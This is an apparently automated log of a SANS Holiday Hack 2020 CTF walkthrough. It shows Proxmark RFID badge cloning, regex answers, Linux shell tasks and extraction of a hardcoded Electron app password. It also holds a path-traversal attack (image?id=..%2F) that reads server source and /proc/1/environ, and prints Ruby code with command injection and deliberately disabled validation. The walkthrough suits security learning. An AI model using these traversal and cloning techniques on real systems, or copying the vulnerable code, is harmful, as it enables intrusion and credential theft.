2020-12-31 18:17:18.925 +00:00 [VRB] Started SANS Holiday Hack, December 2020
2020-12-31 18:17:18.946 +00:00 [VRB] Using CTF runner 0.1.0-alpha.26
2020-12-31 18:17:18.948 +00:00 [VRB] Playing OpenHIDLock, SortOMatic, BrokenTagGenerator, LinuxPremier, PointOfSalePasswordRecovery, TheElfCode, InvestigateS3Bucket, KringleKiosk, UnescapeTmux, Splunk, DialUp336Kbps, RedisBugHunt, SnowballFight, SpeakerDoorOpen, SpeakerLightsOn, SpeakerVendingMachineOn, BlockchainInvestigationPart1, BlockchainInvestigationPart2, ARPShenanigans, CANBusInvestigation, ScapyPrepper, SleighCANDBUS, DefeatFingerprintSensor, OperateTheSantavator, UncoverChristmasList
2020-12-31 18:17:18.950 +00:00 [VRB] Running challange OpenHIDLock
2020-12-31 18:17:18.952 +00:00 [INF] Open proxmark and call lf hid read next to Bow Ninecandle in Talks Lobby
#db# TAG ID: 2006e22f0e (6023) - Format Len: 26 bit - FC: 113 - Card: 6023
2020-12-31 18:17:18.954 +00:00 [INF] Open proxmark and call lf hid read next to Noel Boetie in Wrapping Room
#db# TAG ID: 2006e22f08 (6020) - Format Len: 26 bit - FC: 113 - Card: 6020
2020-12-31 18:17:18.954 +00:00 [INF] Open proxmark and call lf hid read next to Sparkle Redberry in Entryway
#db# TAG ID: 2006e22f0d (6022) - Format Len: 26 bit - FC: 113 - Card: 6022
2020-12-31 18:17:18.954 +00:00 [INF] Open proxmark and call lf hid read next to Angel Candysalt in Great Room
#db# TAG ID: 2006e22f31 (6040) - Format Len: 26 bit - FC: 113 - Card: 6040
2020-12-31 18:17:18.955 +00:00 [INF] Open proxmark and call lf hid read next to Shinny Upatree in Front Lawn
#db# TAG ID: 2006e22f13 (6025) - Format Len: 26 bit - FC: 113 - Card: 6025
2020-12-31 18:17:18.955 +00:00 [INF] Open proxmark and call lf hid read next to  in 

2020-12-31 18:17:18.955 +00:00 [INF] Open proxmark and call lf hid read next to  in 

2020-12-31 18:17:18.955 +00:00 [INF] Open proxmark CLI and type pm3 --> lf hid sim -r 2006e22f0e next to the door in Workshop

                [=] Simulating HID tag using raw 2006e22f0e
                [=] Stopping simulation after 10 seconds.

            
2020-12-31 18:17:18.956 +00:00 [VRB] Challenge OpenHIDLock completed
2020-12-31 18:17:18.957 +00:00 [VRB] Running challange SortOMatic
2020-12-31 18:17:18.959 +00:00 [INF] About
                                
                The SORT-O-MATIC is responsible for separating properly wrapped presents from disfunctional misfit presents. Properly wrapped presents are put into Santa's gift bag while the misfit toys are dropped into a box with a portal to the Island of Misfit Toys.

                The SORT-O-MATIC's configuration works using regular expressions. When all eight regular expressions match the desired values the SORT-O-MATIC will properly sort presents.

                Troubleshooting
                If the SORT-O-MATIC is NOT sorting presents at 100% accuracy, you will need to add the desired regex in the invalid (red-highlighted) inputs and then click the corresponding toggle switch. If you provide the correct regular expression and toggle the switch, the input will turn green and the progress bar will grow. You must reach 100% accuracy in order to fix the SORT-O-MATIC.

                Click on the description above each input to display a message with more details about the desired regular expression.

                Click the HELP button on the SORT-O-MATIC to view this help manual again.

            
2020-12-31 18:17:18.959 +00:00 [INF] 1.Matches at least one digit
[0-9]
2020-12-31 18:17:18.960 +00:00 [INF] 2.Matches 3 alpha a-z characters ignoring case
[A-Za-z][A-Za-z][A-Za-z]
2020-12-31 18:17:18.960 +00:00 [INF] 3. Matches 2 chars of lowercase a-z or numbers
[0-9a-z][0-9a-z]
2020-12-31 18:17:18.960 +00:00 [INF] 4. Matches any 2 chars not uppercase A-L or 1 - 5
[A-L1-5]
2020-12-31 18:17:18.960 +00:00 [INF] 5. Matches three or more digits only
^[0-9][0-9][0-9]+$
2020-12-31 18:17:18.961 +00:00 [INF] 6. Matches multiple hour:minute: second time formats only
^(([01]?[0-9]|2[0-3]):[0-5][0-9]:[0-5][0-9])$
2020-12-31 18:17:18.961 +00:00 [INF] 7. Matches MAC address format only while ignoring case. https://ihateregex.io/expr/mac-address/
^[a-fA-F0-9]{2}(:[a-fA-F0-9]{2}){5}$
2020-12-31 18:17:18.961 +00:00 [INF] 8. Matches multiple day, month, and year date formats only. 
Create a regular expression that only matches one of the three following day, month, and four digit year formats:

                10/01/1978
                01.10.1987
                14-12-1991

                However, the following values would be invalid formats:
                05/25/89
                12-32-1989
                01.1.1989
                1/1/1

                Use anchors or boundary markers to avoid matching other surrounding strings.
^((0[1-9]|1[0-9])[-/.](0[1-9]|[12]\d|3[01])[-/.][12]\d{3})$
2020-12-31 18:17:18.986 +00:00 [VRB] Challenge SortOMatic completed
2020-12-31 18:17:18.987 +00:00 [VRB] Running challange BrokenTagGenerator
2020-12-31 18:17:18.989 +00:00 [INF] Objective 8

                Help Noel Boetie fix the Tag Generator in the Wrapping Room. 
                What value is in the environment variable GREETZ? 
                Talk to Holly Evergreen in the kitchen for help with this.

                https://tag-generator.kringlecastle.com/

            
2020-12-31 18:17:18.989 +00:00 [INF] Holly Evergreen

                Hi Santa!
                If you have a chance, I'd love to get your feedback on the Tag Generator updates!
                I'm a little concerned about the file upload feature, but Noel thinks it will be fine.

                Sorry to be a pest Santa, but could you look at the Tag Generator?
                I've been looking at it, and I wonder if the source code would provide more insight?
                I told Noel we should be more careful about disclosing information in error messages.

                I tried what you suggested and enumerating all endpoints really is good idea to understand an application's functionality.
                Sometimes though, I find the Content-Type header hinders the browser more than it helps.
                Blind command injection can be frustrating though. Do you think output redirection would help?

            
2020-12-31 18:17:19.076 +00:00 [INF] Redirect to Download

                From: Holly Evergreen
                Objective: 8) Broken Tag Generator
                If you find a way to execute code blindly, I bet you can redirect to a file then download that file!

            
2020-12-31 18:17:19.110 +00:00 [INF] Source Code Retrieval
               
                From: Holly Evergreen
                Objective: 8) Broken Tag Generator
                We might be able to find the problem if we can get source code!

            
2020-12-31 18:17:19.112 +00:00 [INF] Download File Mechanism
               
                From: Holly Evergreen
                Objective: 8) Broken Tag Generator
                Once you know the path to the file, we need a way to download it!

            
2020-12-31 18:17:19.121 +00:00 [INF] Error Page Message Disclosure
                
                From: Holly Evergreen
                Objective: 8) Broken Tag Generator
                Can you figure out the path to the script? It's probably on error pages!
            
2020-12-31 18:17:19.153 +00:00 [INF] Content-Type Gotcha
               
                From: Holly Evergreen
                Objective: 8) Broken Tag Generator
                If you're having trouble seeing the code, watch out for the Content-Type! Your browser might be trying to help (badly)!

            
2020-12-31 18:17:19.160 +00:00 [INF] Endpoint Exploration
                
                From: Holly Evergreen
                Objective: 8) Broken Tag Generator
                Is there an endpoint that will print arbitrary files?
            
2020-12-31 18:17:19.199 +00:00 [INF] Source Code Analysis

                From: Holly Evergreen
                Objective: 8) Broken Tag Generator
                I'm sure there's a vulnerability in the source somewhere... surely Jack wouldn't leave their mark?

            
2020-12-31 18:17:19.236 +00:00 [INF] Patience and Timing

                From: Holly Evergreen
                Objective: 8) Broken Tag Generator
                Remember, the processing happens in the background so you might need to wait a bit after exploiting but before grabbing the output!
            
2020-12-31 18:17:19.262 +00:00 [INF] Upload a text file and we find out about /app/lib/app.rb and some /tmp/RackMultipart20201228-1-dzifup.txt

                ERROR
                Something went wrong!
                Error in /app/lib/app.rb: Unsupported file type: /tmp/RackMultipart20201228-1-dzifup.txt

                Close
            
2020-12-31 18:17:19.295 +00:00 [INF] https://tag-generator.kringlecastle.com/app

                Something went wrong!
                Error in /app/lib/app.rb: Route not found

            
2020-12-31 18:17:19.300 +00:00 [INF] fabric.js

                toDataURL: function(t, e, i) {
                        return t.toDataURL("image/" + e, i)
                },
            
2020-12-31 18:17:19.302 +00:00 [INF] https://tag-generator.kringlecastle.com/share

                Something went wrong!
                Error in /app/lib/app.rb: ID is missing!
            
2020-12-31 18:17:19.328 +00:00 [INF] https://tag-generator.kringlecastle.com/share

                Something went wrong!
                Error in /app/lib/app.rb: ID is missing!

                https://tag-generator.kringlecastle.com/share?id=????
            
2020-12-31 18:17:19.333 +00:00 [INF] https://tag-generator.kringlecastle.com/image?id=

                PGgxPlNvbWV0aGluZyB3ZW50IHdyb25nITwvaDE+Cgo8cD5FcnJvciBpbiAvYXBwL2xpYi9hcHAucmI6IElzIGEgZGlyZWN0b3J5IEAgaW9fZnJlYWQgLSAvdG1wLzwvcD4K
            
2020-12-31 18:17:19.335 +00:00 [INF] base64 returns <p>Error in /app/lib/app.rb: Is a directory @ io_fread - /tmp/</p>
<h1>Something went wrong!</h1>

<p>Error in /app/lib/app.rb: Is a directory @ io_fread - /tmp/</p>

2020-12-31 18:17:19.360 +00:00 [INF] https://tag-generator.kringlecastle.com/image?id=..%2Fapp%2Flib%2Fapp.rb

               IyBlbmNvZGluZzogQVNDSUktOEJJVAoKVE1QX0ZPTERFUiA9ICcvdG1wJwpGSU5BTF9GT0xERVIgPSAnL3RtcCcKCiMgRG9uJ3QgcHV0IHRoZSB1cGxvYWRzIGluIHRoZSBhcHBsaWNhdGlvbiBmb2xkZXIKRGlyLmNoZGlyIFRNUF9GT0xERVIKCnJlcXVpcmUgJ3J1YnlnZW1zJwoKcmVxdWlyZSAnanNvbicKcmVxdWlyZSAnc2luYXRyYScKcmVxdWlyZSAnc2luYXRyYS9iYXNlJwpyZXF1aXJlICdzaW5nbG9nZ2VyJwpyZXF1aXJlICdzZWN1cmVyYW5kb20nCgpyZXF1aXJlICd6aXAnCnJlcXVpcmUgJ3NpbmF0cmEvY29va2llcycKcmVxdWlyZSAnY2dpJwoKcmVxdWlyZSAnZGlnZXN0L3NoYTEnCgpMT0dHRVIgPSA6OlNpbmdMb2dnZXIuaW5zdGFuY2UoKQoKTUFYX1NJWkUgPSAxMDI0KioyKjUgIyA1bWIKCiMgTWFudWFsbHkgZXNjYXBpbmcgaXMgYW5ub3lpbmcsIGJ1dCBTaW5hdHJhIGlzIGxpZ2h0d2VpZ2h0IGFuZCBkb2Vzbid0IGhhdmUKIyBzdHVmZiBsaWtlIHRoaXMgYnVpbHQgaW4gOigKZGVmIGgoaHRtbCkKICBDR0kuZXNjYXBlSFRNTCBodG1sCmVuZAoKZGVmIGhhbmRsZV96aXAoZmlsZW5hbWUpCiAgTE9HR0VSLmRlYnVnKCJQcm9jZXNzaW5nICN7IGZpbGVuYW1lIH0gYXMgYSB6aXAiKQogIG91dF9maWxlcyA9IFtdCgogIFppcDo6RmlsZS5vcGVuKGZpbGVuYW1lKSBkbyB8emlwX2ZpbGV8CiAgICAjIEhhbmRsZSBlbnRyaWVzIG9uZSBieSBvbmUKICAgIHppcF9maWxlLmVhY2ggZG8gfGVudHJ5fAogICAgICBMT0dHRVIuZGVidWcoIkV4dHJhY3RpbmcgI3tlbnRyeS5uYW1lfSIpCgogICAgICBpZiBlbnRyeS5zaXplID4gTUFYX1NJWkUKICAgICAgICByYWlzZSAnRmlsZSB0b28gbGFyZ2Ugd2hlbiBleHRyYWN0ZWQnCiAgICAgIGVuZAoKICAgICAgaWYgZW50cnkubmFtZSgpLmVuZF93aXRoPygnemlwJykKICAgICAgICByYWlzZSAnTmVzdGVkIHppcCBmaWxlcyBhcmUgbm90IHN1cHBvcnRlZCEnCiAgICAgIGVuZAoKICAgICAgIyBJIHdvbmRlciB3aGF0IHRoaXMgd2lsbCBkbz8gLS1KYWNrCiAgICAgICMgaWYgZW50cnkubmFtZSAhfiAvXlthLXpBLVowLTkuXy1dKyQvCiAgICAgICMgICByYWlzZSAnSW52YWxpZCBmaWxlbmFtZSEgRmlsZW5hbWVzIG1heSBjb250YWluIGxldHRlcnMsIG51bWJlcnMsIHBlcmlvZCwgdW5kZXJzY29yZSwgYW5kIGh5cGhlbicKICAgICAgIyBlbmQKCiAgICAgICMgV2Ugd2FudCB0byBleHRyYWN0IGludG8gVE1QX0ZPTERFUgogICAgICBvdXRfZmlsZSA9ICIjeyBUTVBfRk9MREVSIH0vI3sgZW50cnkubmFtZSB9IgoKICAgICAgIyBFeHRyYWN0IHRvIGZpbGUgb3IgZGlyZWN0b3J5IGJhc2VkIG9uIG5hbWUgaW4gdGhlIGFyY2hpdmUKICAgICAgZW50cnkuZXh0cmFjdChvdXRfZmlsZSkgewogICAgICAgICMgSWYgdGhlIGZpbGUgZXhpc3RzLCBzaW1wbHkgb3ZlcndyaXRlCiAgICAgICAgdHJ1ZQogICAgICB9CgogICAgICAjIFByb2Nlc3MgaXQKICAgICAgb3V0X2ZpbGVzIDw8IHByb2Nlc3NfZmlsZShvdXRfZmlsZSkKICAgIGVuZAogIGVuZAoKICByZXR1cm4gb3V0X2ZpbGVzCmVuZAoKZGVmIGhhbmRsZV9pbWFnZShmaWxlbmFtZSkKICBvdXRfZmlsZW5hbWUgPSAiI3sgU2VjdXJlUmFuZG9tLnV1aWQgfSN7RmlsZS5leHRuYW1lKGZpbGVuYW1lKS5kb3duY2FzZX0iCiAgb3V0X3BhdGggPSAiI3sgRklOQUxfRk9MREVSIH0vI3sgb3V0X2ZpbGVuYW1lIH0iCgogICMgUmVzaXplIGFuZCBjb21wcmVzcyBpbiB0aGUgYmFja2dyb3VuZAogIFRocmVhZC5uZXcgZG8KICAgIGlmICFzeXN0ZW0oImNvbnZlcnQgLXJlc2l6ZSA4MDB4NjAwXFw+IC1xdWFsaXR5IDc1ICcjeyBmaWxlbmFtZSB9JyAnI3sgb3V0X3BhdGggfSciKQogICAgICBMT0dHRVIuZXJyb3IoIlNvbWV0aGluZyB3ZW50IHdyb25nIHdpdGggZmlsZSBjb252ZXJzaW9uOiAjeyBmaWxlbmFtZSB9IikKICAgIGVsc2UKICAgICAgTE9HR0VSLmRlYnVnKCJGaWxlIHN1Y2Nlc3NmdWxseSBjb252ZXJ0ZWQ6ICN7IGZpbGVuYW1lIH0iKQogICAgZW5kCiAgZW5kCgogICMgUmV0dXJuIGp1c3QgdGhlIGZpbGVuYW1lIC0gd2UgY2FuIGZpZ3VyZSB0aGF0IG91dCBsYXRlcgogIHJldHVybiBvdXRfZmlsZW5hbWUKZW5kCgpkZWYgcHJvY2Vzc19maWxlKGZpbGVuYW1lKQogIG91dF9maWxlcyA9IFtdCgogIGlmIGZpbGVuYW1lLmRvd25jYXNlLmVuZF93aXRoPygnemlwJykKICAgICMgQXBwZW5kIHRoZSBsaXN0IHJldHVybmVkIGJ5IGhhbmRsZV96aXAKICAgIG91dF9maWxlcyArPSBoYW5kbGVfemlwKGZpbGVuYW1lKQogIGVsc2lmIGZpbGVuYW1lLmRvd25jYXNlLmVuZF93aXRoPygnanBnJykgfHwgZmlsZW5hbWUuZG93bmNhc2UuZW5kX3dpdGg/KCdqcGVnJykgfHwgZmlsZW5hbWUuZG93bmNhc2UuZW5kX3dpdGg/KCdwbmcnKQogICAgIyBBcHBlbmQgdGhlIG5hbWUgcmV0dXJuZWQgYnkgaGFuZGxlX2ltYWdlCiAgICBvdXRfZmlsZXMgPDwgaGFuZGxlX2ltYWdlKGZpbGVuYW1lKQogIGVsc2UKICAgIHJhaXNlICJVbnN1cHBvcnRlZCBmaWxlIHR5cGU6ICN7IGZpbGVuYW1lIH0iCiAgZW5kCgogIHJldHVybiBvdXRfZmlsZXMKZW5kCgpkZWYgcHJvY2Vzc19maWxlcyhmaWxlcykKICByZXR1cm4gZmlsZXMubWFwIHsgfGZ8IHByb2Nlc3NfZmlsZShmKSB9LmZsYXR0ZW4oKQplbmQKCm1vZHVsZSBUYWdHZW5lcmF0b3IKICBjbGFzcyBTZXJ2ZXIgPCBTaW5hdHJhOjpCYXNlCiAgICBoZWxwZXJzIFNpbmF0cmE6OkNvb2tpZXMKCiAgICBkZWYgaW5pdGlhbGl6ZSgqYXJncykKICAgICAgc3VwZXIoKmFyZ3MpCiAgICBlbmQKCiAgICBjb25maWd1cmUgZG8KICAgICAgaWYoZGVmaW5lZD8oUEFSQU1TKSkKICAgICAgICBzZXQgOnBvcnQsIFBBUkFNU1s6cG9ydF0KICAgICAgICBzZXQgOmJpbmQsIFBBUkFNU1s6aG9zdF0KICAgICAgZW5kCgogICAgICBzZXQgOnJhaXNlX2Vycm9ycywgZmFsc2UKICAgICAgc2V0IDpzaG93X2V4Y2VwdGlvbnMsIGZhbHNlCiAgICBlbmQKCiAgICBlcnJvciBkbwogICAgICByZXR1cm4gNTAxLCBlcmIoOmVycm9yLCA6bG9jYWxzID0+IHsgbWVzc2FnZTogIkVycm9yIGluICN7IF9fRklMRV9fIH06ICN7IGgoZW52WydzaW5hdHJhLmVycm9yJ10ubWVzc2FnZSkgfSIgfSkKICAgIGVuZAoKICAgIG5vdF9mb3VuZCBkbwogICAgICByZXR1cm4gNDA0LCBlcmIoOmVycm9yLCA6bG9jYWxzID0+IHsgbWVzc2FnZTogIkVycm9yIGluICN7IF9fRklMRV9fIH06IFJvdXRlIG5vdCBmb3VuZCIgfSkKICAgIGVuZAoKICAgIGdldCAnLycgZG8KICAgICAgZXJiKDppbmRleCkKICAgIGVuZAoKICAgIHBvc3QgJy91cGxvYWQnIGRvCiAgICAgIGltYWdlcyA9IFtdCiAgICAgIGltYWdlcyArPSBwcm9jZXNzX2ZpbGVzKHBhcmFtc1snbXlfZmlsZSddLm1hcCB7IHxwfCBwWyd0ZW1wZmlsZSddLnBhdGggfSkKICAgICAgaW1hZ2VzLnNvcnQhKCkKICAgICAgaW1hZ2VzLnVuaXEhKCkKCiAgICAgIGNvbnRlbnRfdHlwZSA6anNvbgogICAgICBpbWFnZXMudG9fanNvbgogICAgZW5kCgogICAgZ2V0ICcvY2xlYXInIGRvCiAgICAgIGNvb2tpZXMuZGVsZXRlKDppbWFnZXMpCgogICAgICByZWRpcmVjdCAnLycKICAgIGVuZAoKICAgIGdldCAnL2ltYWdlJyBkbwogICAgICBpZiAhcGFyYW1zWydpZCddCiAgICAgICAgcmFpc2UgJ0lEIGlzIG1pc3NpbmchJwogICAgICBlbmQKCiAgICAgICMgVmFsaWRhdGlvbiBpcyBib3JpbmchIC0tSmFjawogICAgICAjIGlmIHBhcmFtc1snaWQnXSAhfiAvXlthLXpBLVowLTkuXy1dKyQvCiAgICAgICMgICByZXR1cm4gNDAwLCAnSW52YWxpZCBpZCEgaWQgbWF5IGNvbnRhaW4gbGV0dGVycywgbnVtYmVycywgcGVyaW9kLCB1bmRlcnNjb3JlLCBhbmQgaHlwaGVuJwogICAgICAjIGVuZAoKICAgICAgY29udGVudF90eXBlICdpbWFnZS9qcGVnJwoKICAgICAgZmlsZW5hbWUgPSAiI3sgRklOQUxfRk9MREVSIH0vI3sgcGFyYW1zWydpZCddIH0iCgogICAgICBpZiBGaWxlLmV4aXN0cz8oZmlsZW5hbWUpCiAgICAgICAgcmV0dXJuIEZpbGUucmVhZChmaWxlbmFtZSkKICAgICAgZWxzZQogICAgICAgIHJldHVybiA0MDQsICJJbWFnZSBub3QgZm91bmQhIgogICAgICBlbmQKICAgIGVuZAoKICAgIGdldCAnL3NoYXJlJyBkbwogICAgICBpZiAhcGFyYW1zWydpZCddCiAgICAgICAgcmFpc2UgJ0lEIGlzIG1pc3NpbmchJwogICAgICBlbmQKCiAgICAgIGZpbGVuYW1lID0gIiN7IEZJTkFMX0ZPTERFUiB9LyN7IHBhcmFtc1snaWQnXSB9LnBuZyIKCiAgICAgIGlmIEZpbGUuZXhpc3RzPyhmaWxlbmFtZSkKICAgICAgICBlcmIoOnNoYXJlLCA6bG9jYWxzID0+IHsgaWQ6IHBhcmFtc1snaWQnXSB9KQogICAgICBlbHNlCiAgICAgICAgcmV0dXJuIDQwNCwgIkltYWdlIG5vdCBmb3VuZCEiCiAgICAgIGVuZAogICAgZW5kCgogICAgcG9zdCAnL3NhdmUnIGRvCiAgICAgIHBheWxvYWQgPSBwYXJhbXMKICAgICAgcGF5bG9hZCA9IEpTT04ucGFyc2UocmVxdWVzdC5ib2R5LnJlYWQpCgogICAgICBkYXRhX3VybCA9IHBheWxvYWRbJ2RhdGFVUkwnXQogICAgICBwbmcgPSBCYXNlNjQuZGVjb2RlNjQoZGF0YV91cmxbJ2RhdGE6aW1hZ2UvcG5nO2Jhc2U2NCwnLmxlbmd0aCAuLiAtMV0pCgogICAgICBvdXRfaGFzaCA9IERpZ2VzdDo6U0hBMS5oZXhkaWdlc3QgcG5nCiAgICAgIG91dF9maWxlbmFtZSA9ICIjeyBvdXRfaGFzaCB9LnBuZyIKICAgICAgb3V0X3BhdGggPSAiI3sgRklOQUxfRk9MREVSIH0vI3sgb3V0X2ZpbGVuYW1lIH0iCiAgICAgIAogICAgICBMT0dHRVIuZGVidWcoIm91dHB1dDogI3tvdXRfcGF0aH0iKQogICAgICBGaWxlLm9wZW4ob3V0X3BhdGgsICd3YicpIHsgfGZ8IGYud3JpdGUocG5nKSB9CiAgICAgIHsgaWQ6IG91dF9oYXNoIH0udG9fanNvbgogICAgZW5kCiAgZW5kCmVuZAo=  
            
2020-12-31 18:17:19.494 +00:00 [INF] /app/lib/app.rb
# encoding: ASCII-8BIT

TMP_FOLDER = '/tmp'
FINAL_FOLDER = '/tmp'

# Don't put the uploads in the application folder
Dir.chdir TMP_FOLDER

require 'rubygems'

require 'json'
require 'sinatra'
require 'sinatra/base'
require 'singlogger'
require 'securerandom'

require 'zip'
require 'sinatra/cookies'
require 'cgi'

require 'digest/sha1'

LOGGER = ::SingLogger.instance()

MAX_SIZE = 1024**2*5 # 5mb

# Manually escaping is annoying, but Sinatra is lightweight and doesn't have
# stuff like this built in :(
def h(html)
  CGI.escapeHTML html
end

def handle_zip(filename)
  LOGGER.debug("Processing #{ filename } as a zip")
  out_files = []

  Zip::File.open(filename) do |zip_file|
    # Handle entries one by one
    zip_file.each do |entry|
      LOGGER.debug("Extracting #{entry.name}")

      if entry.size > MAX_SIZE
        raise 'File too large when extracted'
      end

      if entry.name().end_with?('zip')
        raise 'Nested zip files are not supported!'
      end

      # I wonder what this will do? --Jack
      # if entry.name !~ /^[a-zA-Z0-9._-]+$/
      #   raise 'Invalid filename! Filenames may contain letters, numbers, period, underscore, and hyphen'
      # end

      # We want to extract into TMP_FOLDER
      out_file = "#{ TMP_FOLDER }/#{ entry.name }"

      # Extract to file or directory based on name in the archive
      entry.extract(out_file) {
        # If the file exists, simply overwrite
        true
      }

      # Process it
      out_files << process_file(out_file)
    end
  end

  return out_files
end

def handle_image(filename)
  out_filename = "#{ SecureRandom.uuid }#{File.extname(filename).downcase}"
  out_path = "#{ FINAL_FOLDER }/#{ out_filename }"

  # Resize and compress in the background
  Thread.new do
    if !system("convert -resize 800x600\\> -quality 75 '#{ filename }' '#{ out_path }'")
      LOGGER.error("Something went wrong with file conversion: #{ filename }")
    else
      LOGGER.debug("File successfully converted: #{ filename }")
    end
  end

  # Return just the filename - we can figure that out later
  return out_filename
end

def process_file(filename)
  out_files = []

  if filename.downcase.end_with?('zip')
    # Append the list returned by handle_zip
    out_files += handle_zip(filename)
  elsif filename.downcase.end_with?('jpg') || filename.downcase.end_with?('jpeg') || filename.downcase.end_with?('png')
    # Append the name returned by handle_image
    out_files << handle_image(filename)
  else
    raise "Unsupported file type: #{ filename }"
  end

  return out_files
end

def process_files(files)
  return files.map { |f| process_file(f) }.flatten()
end

module TagGenerator
  class Server < Sinatra::Base
    helpers Sinatra::Cookies

    def initialize(*args)
      super(*args)
    end

    configure do
      if(defined?(PARAMS))
        set :port, PARAMS[:port]
        set :bind, PARAMS[:host]
      end

      set :raise_errors, false
      set :show_exceptions, false
    end

    error do
      return 501, erb(:error, :locals => { message: "Error in #{ __FILE__ }: #{ h(env['sinatra.error'].message) }" })
    end

    not_found do
      return 404, erb(:error, :locals => { message: "Error in #{ __FILE__ }: Route not found" })
    end

    get '/' do
      erb(:index)
    end

    post '/upload' do
      images = []
      images += process_files(params['my_file'].map { |p| p['tempfile'].path })
      images.sort!()
      images.uniq!()

      content_type :json
      images.to_json
    end

    get '/clear' do
      cookies.delete(:images)

      redirect '/'
    end

    get '/image' do
      if !params['id']
        raise 'ID is missing!'
      end

      # Validation is boring! --Jack
      # if params['id'] !~ /^[a-zA-Z0-9._-]+$/
      #   return 400, 'Invalid id! id may contain letters, numbers, period, underscore, and hyphen'
      # end

      content_type 'image/jpeg'

      filename = "#{ FINAL_FOLDER }/#{ params['id'] }"

      if File.exists?(filename)
        return File.read(filename)
      else
        return 404, "Image not found!"
      end
    end

    get '/share' do
      if !params['id']
        raise 'ID is missing!'
      end

      filename = "#{ FINAL_FOLDER }/#{ params['id'] }.png"

      if File.exists?(filename)
        erb(:share, :locals => { id: params['id'] })
      else
        return 404, "Image not found!"
      end
    end

    post '/save' do
      payload = params
      payload = JSON.parse(request.body.read)

      data_url = payload['dataURL']
      png = Base64.decode64(data_url['data:image/png;base64,'.length .. -1])

      out_hash = Digest::SHA1.hexdigest png
      out_filename = "#{ out_hash }.png"
      out_path = "#{ FINAL_FOLDER }/#{ out_filename }"
      
      LOGGER.debug("output: #{out_path}")
      File.open(out_path, 'wb') { |f| f.write(png) }
      { id: out_hash }.to_json
    end
  end
end

2020-12-31 18:17:19.632 +00:00 [INF] Jack Frost commented out file name validation within zip archives in def handle_zip(filename).


                # I wonder what this will do? --Jack
                # if entry.name !~ /^[a-zA-Z0-9._-]+$/
                #   raise 'Invalid filename! Filenames may contain letters, numbers, period, underscore, and hyphen'
                # end
            
2020-12-31 18:17:19.635 +00:00 [INF] hmm... created zip file with ../app/lib/app.rb file name but the injection did not work... 

                ERROR
                Something went wrong!
                Error in /app/lib/app.rb: Permission denied @ rb_sysopen - /tmp/../app/lib/app.rb

                Close
            
2020-12-31 18:17:19.667 +00:00 [INF] https://tag-generator.kringlecastle.com/image?id=..%2Fproc%2F1%2Fenviron

                UEFUSD0vdXNyL2xvY2FsL2J1bmRsZS9iaW46L3Vzci9sb2NhbC9zYmluOi91c3IvbG9jYWwvYmluOi91c3Ivc2JpbjovdXNyL2Jpbjovc2JpbjovYmluAEhPU1ROQU1FPWNiZjI4MTBiNzU3MwBSVUJZX01BSk9SPTIuNwBSVUJZX1ZFUlNJT049Mi43LjAAUlVCWV9ET1dOTE9BRF9TSEEyNTY9MjdkMzUwYTUyYTAyYjUzMDM0Y2EwNzk0ZWZlNTE4NjY3ZDU1OGYxNTI2NTZjMmJhYWYwOGYzZDBjOGIwMjM0MwBHRU1fSE9NRT0vdXNyL2xvY2FsL2J1bmRsZQBCVU5ETEVfU0lMRU5DRV9ST09UX1dBUk5JTkc9MQBCVU5ETEVfQVBQX0NPTkZJRz0vdXNyL2xvY2FsL2J1bmRsZQBBUFBfSE9NRT0vYXBwAFBPUlQ9NDE0MQBIT1NUPTAuMC4wLjAAR1JFRVRaPUphY2tGcm9zdFdhc0hlcmUASE9NRT0vaG9tZS9hcHAA
              
                PATH=/usr/local/bundle/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin HOSTNAME=cbf2810b7573 RUBY_MAJOR=2.7 RUBY_VERSION=2.7.0 RUBY_DOWNLOAD_SHA256=27d350a52a02b53034ca0794efe518667d558f152656c2baaf08f3d0c8b02343 GEM_HOME=/usr/local/bundle BUNDLE_SILENCE_ROOT_WARNING=1 BUNDLE_APP_CONFIG=/usr/local/bundle APP_HOME=/app PORT=4141 HOST=0.0.0.0 GREETZ=JackFrostWasHere HOME=/home/app 
            
                GREETZ=JackFrostWasHere
    
            
2020-12-31 18:17:19.670 +00:00 [VRB] Challenge BrokenTagGenerator completed
2020-12-31 18:17:19.672 +00:00 [VRB] Running challange LinuxPremier
2020-12-31 18:17:19.673 +00:00 [INF] Linux Premier

                The North Pole 🍭 Lollipop Maker:
                All the lollipops on this system have been stolen by munchkins. Capture munchkins by following instructions here and 🍭's will appear in the green bar below. Run the command "hintme" to receive a hint.
            
2020-12-31 18:17:19.697 +00:00 [INF] Complete challenge by typing following commands

                yes
                ls
                cat munchkin_19315479765589239 
                rm munchkin_19315479765589239
                pwd
                ls -a
                cat .bash_history
                set
                cd workshop/
                grep -i munch *.txt
                chmod +x lollipop_engine
                ./lollipop_engine
                cd electrical/
                mv blown_fuse0 fuse0

            
2020-12-31 18:17:19.700 +00:00 [INF] A munchkin is blocking the lollipop_engine from starting. Run the lollipop_engine binary to retrieve this munchkin.
chmod +x lollipop_engine
./lollipop_engine
2020-12-31 18:17:19.701 +00:00 [VRB] Challenge LinuxPremier completed
2020-12-31 18:17:19.726 +00:00 [VRB] Running challange PointOfSalePasswordRecovery
2020-12-31 18:17:19.730 +00:00 [INF] Solution 1: Use asar from npm and extract app.asar


                1. Install prerequites for asar archive extraction `npm install -g --engine-strict asar` (Install nodejs if you don't have it)
                2. Install santa_shop.exe ??? I would preffer not do that ... 
                3. Find app.asar in Program Files ...
                4. Extract the app.asar using `asar e app.asar .\\app`

                Password can be found in the beginning of main.js


                // Modules to control application life and create native browser window
                const { app, BrowserWindow, ipcMain } = require('electron');
                const path = require('path');

                const SANTA_PASSWORD = 'santapass';

                // TODO: Maybe get these from an API?

            
2020-12-31 18:17:19.733 +00:00 [INF] Solution 2: Use 7zip only


                1. Rename santa_shop.exe to santa_shop.exe.7z
                2. Open santa_shop.exe.7z with 7z interface and go to:  santa-shop.exe.7z\$PLUGINSDIR\app-64.7z\resources\
                3. View app.asar file...
                

                       ý  {"files":{"README.md":{"size":79,"offset":"0"},"index.html":{"size":1284,"offset":"79"},"main.js":{"size":2713,"offset":"1363"},"package.json":{"size":202,"offset":"4076"},"preload.js":{"size":138,"offset":"4278"},"renderer.js":{"size":5984,"offset":"4416"},"style.css":{"size":3801,"offset":"10400"},"img":{"files":{"network1.png":{"size":35028,"offset":"14201"},"network2.png":{"size":31636,"offset":"49229"},"network3.png":{"size":29293,"offset":"80865"},"network4.png":{"size":25457,"offset":"110158"}}}}}   Remember, if you need to change Santa's passwords, it's at the top of main.js!
                <!DOCTYPE html>
                <html>
                    <head>
                    <meta charset="UTF-8">
